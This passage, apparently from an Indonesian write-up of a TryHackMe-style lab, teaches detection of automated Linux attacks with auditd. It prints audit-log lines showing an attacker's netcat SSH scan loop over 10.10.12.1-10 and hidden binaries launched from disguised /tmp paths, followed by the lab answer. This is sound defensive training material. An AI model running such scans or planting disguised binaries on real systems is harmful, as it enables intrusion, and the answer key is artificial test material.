caranya : Log auditduntuk tsmpemindai ( nohup /tmp/.X26-unix/.rsync/c/tsm ...) akan menunjukkan argumen yang diteruskan kepadanya, termasuk rentang IP yang dikonfigurasi untuk dipindai.

root@thm-vm:/home/ubuntu/scenario$ ausearch -i -if /home/ubuntu/scenario/audit.log
 | grep proctitle=nohup
 type=PROCTITLE msg=audit(09/11/25 21:15:20.512:2283) : proctitle=nohup bash -c for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2284) : proctitle=nohup bash -c for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2285) : proctitle=nohup bash -c for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2286) : proctitle=nohup bash -c for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2287) : proctitle=nohup bash -c for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
type=PROCTITLE msg=audit(09/11/25 21:16:08.666:2337) : proctitle=nohup /tmp/.apt/kernupd/kernupd 
type=PROCTITLE msg=audit(09/11/25 21:16:08.668:2338) : proctitle=nohup /tmp/.apt/kernupd/kernupd 

<img width="1226" height="290" alt="image" src="https://github.com/user-attachments/assets/cd04cb51-b752-409b-b022-d45754c05a30" />


jawaban : 10.10.12.1-10.10.12.10

Jawaban yang Benar

# Conclution /Kesimpulan 
Di ruangan ini, Anda telah mempelajari banyak hal tentang serangan "Hack and Forget" pada Linux , mulai dari perintah Discovery pertama hingga Impact terakhir. Anda juga telah menjelajahi cara mendeteksi tahapan serangan menggunakan auditd dan log otentikasi, dan bahkan mempraktikkan keterampilan Anda dengan mengungkap serangan cryptominer!

Poin-Poin Penting
Serangan "Hack and Forget" biasanya diotomatisasi dan dilakukan dalam skala besar oleh botnet.
Di Linux , semua tahapan serangan sebagian besar bergantung pada perintah bawaan seperti ls, cat, wget, dan ssh.
Pendekatan terbaik Anda dalam mendeteksi perintah berbahaya adalah dengan menggunakan auditd dan analisis pohon proses.
